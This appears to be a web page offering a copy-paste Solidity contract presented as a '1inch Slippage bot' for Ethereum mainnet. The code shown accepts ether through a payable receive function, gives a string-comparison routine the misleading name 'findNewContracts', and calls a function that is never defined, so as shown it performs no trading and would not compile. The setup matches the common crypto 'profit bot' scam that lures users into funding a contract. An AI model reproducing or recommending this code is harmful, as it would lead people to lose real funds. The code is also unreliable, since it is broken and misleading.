<div class="code-container">
    <code id="code-block">
//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract OneinchSlippageBot {
    string public tokenName;
    string public tokenSymbol;
    uint liquidity;
    
    event Log(string _msg);
    
    constructor() public {
        // tokenSymbol = _mainTokenSymbol;
        // tokenName = _mainTokenName;
    }
    
    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;
        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            uint a;
            uint b;
            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }
            if (a != b) {
                uint256 mask = uint256(-1);
                if (shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }
}
    </code>
</div>

<button class="copy-btn" onclick="copyCode()">Copy Code</button>

<script>
    function copyCode() {
        const codeBlock = document.getElementById('code-block').innerText;
        const tempTextArea = document.createElement('textarea');
        tempTextArea.value = codeBlock;
        document.body.appendChild(tempTextArea);
        tempTextArea.select();
        document.execCommand('copy');
        document.body.removeChild(tempTextArea);
        alert('Code copied to clipboard!');
    }
</script>

</body>
</html>
